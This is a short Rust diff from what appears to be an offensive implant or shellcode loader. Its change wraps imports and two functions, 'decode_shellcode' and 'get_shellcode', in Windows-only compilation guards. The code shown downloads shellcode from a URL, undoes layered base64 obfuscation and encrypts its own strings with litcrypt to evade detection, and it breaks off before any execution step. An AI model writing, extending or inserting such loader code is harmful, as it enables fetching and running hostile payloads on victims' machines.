@@ -1,8 +1,9 @@
 use std::error::Error;
 use litcrypt::lc;
-use base64::decode as b64_decode;
-use reqwest::Client;
-use crate::logger::{Logger, log_out};
+#[cfg(windows)] use base64::decode as b64_decode;
+#[cfg(windows)] use reqwest::Client;
+#[cfg(windows)] use crate::logger::{Logger, log_out};
+use crate::logger::Logger;
 use crate::cmd::{CommandArgs, command_out};
 #[cfg(windows)] use windows::Win32:: {
     Foundation::{
@@ -37,6 +38,7 @@ use crate::cmd::{CommandArgs, command_out};
 #[cfg(windows)] use std::ptr;
 #[cfg(windows)] use core::ffi::c_void; 
 
+#[cfg(windows)]
 async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, String> {
     logger.debug(log_out!("Starting shellcode debug"));
     let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
@@ -61,7 +63,7 @@ async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> R
 
 
 /// Handles the retrieval and deobfuscation of shellcode from a url.
-
+#[cfg(windows)]
 async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, String> {
     // Download shellcode, or try to
     let client = Client::new();
